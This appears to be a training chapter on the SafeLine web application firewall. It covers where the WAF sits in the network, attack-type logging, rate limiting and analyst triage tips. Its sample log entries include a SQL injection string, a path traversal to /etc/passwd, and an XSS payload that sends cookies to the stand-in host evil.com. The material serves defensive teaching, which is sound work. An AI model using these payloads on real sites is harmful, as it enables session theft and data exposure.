Chapter 12

SafeLine WAF Deep Dive

Architecture, detection modes, attack type taxonomy, rule logic, rate limiting, and the complete SafeLine log field reference for every web attack category.

Learning Objectives

  • Explain where SafeLine WAF sits in the network path and what it can and cannot inspect
  • Describe the three SafeLine detection modes: observe, intercept, and strict
  • Read a SafeLine log entry for each major attack type: SQLi, XSS, RCE, path traversal, scanner
  • Understand SafeLine rate limiting and how it stops brute force and DDoS at the application layer
  • Interpret the SafeLine attack_type taxonomy and map each type to a risk level

SafeLine Architecture: Where It Sits

SafeLine WAF is a reverse proxy that sits between incoming web traffic and your web application. Every HTTP request passes through SafeLine before reaching the application server. SafeLine inspects the full HTTP request, applies detection rules, and either forwards the request or blocks it and returns a 403 response to the client.

SafeLine WAF Network Position
SafeLine sits between Sophos and the application server. When a request is blocked, the application server never receives it and never generates an error log for it.

Attack Type Taxonomy and Log Examples

SafeLine identifies the type of attack in the attack_type field of every blocked or flagged request. Here is every major attack type, what it looks like in a request, and the full log entry.

SQL Injection (sqli)

{ "timestamp": "2026-09-20T10:31:05.221Z", "src_ip": "185.220.101.45", "method": "GET", "url": "/products?id=1%27%20OR%201%3D1--", "attack_type": "sqli", "action": "block", "status_code": 403, "rule_id": "942100", "payload": "1' OR 1=1--", "user_agent": "sqlmap/1.7.9#stable" }

The URL-decoded payload is 1' OR 1=1--. This is a classic SQL injection attempt that tries to make the WHERE clause always true, potentially returning all rows from the database.

Cross-Site Scripting (xss)

{ "timestamp": "2026-09-20T10:32:18.004Z", "src_ip": "91.108.56.142", "method": "POST", "url": "/comments/submit", "attack_type": "xss", "action": "block", "status_code": 403, "payload": "<script>document.location='http://evil.com/steal?c='+document.cookie</script>" }

Path Traversal (path_traversal)

{ "timestamp": "2026-09-20T10:33:44.812Z", "src_ip": "194.165.16.11", "method": "GET", "url": "/download?file=../../../etc/passwd", "attack_type": "path_traversal", "action": "block", "status_code": 403, "payload": "../../../etc/passwd" }

Rate Limiting and Application-Layer DDoS Protection

SafeLine can enforce request rate limits per IP address, per URL, or per session. When a client exceeds the threshold, subsequent requests are blocked or challenged (CAPTCHA) until the window resets.

SafeLine Rate Limit Event Flow
SafeLine blocks requests that exceed the rate limit with HTTP 429. The log entry shows attack_type=rate_limit and includes the request count that triggered the rule.

Key Takeaways

  • SafeLine sits between Sophos and the application server as a reverse proxy. Blocked requests never reach the application and never appear in application logs.
  • Use Observe mode when first deploying or tuning. Use Intercept for normal operations. Use Strict during active attack campaigns and for high-value targets.
  • The attack_type field is your triage starting point. rce and sqli require immediate investigation. path_traversal and xss require investigation within the shift. scanner is lower priority but indicates reconnaissance.
  • Always URL-decode the payload field before analysis. Attackers use encoding (%27 = single quote) to bypass simple text matching.
  • Cross-reference src_ip from SafeLine logs with Wazuh and Sophos logs to build the full picture of what the attacker was doing across all layers.
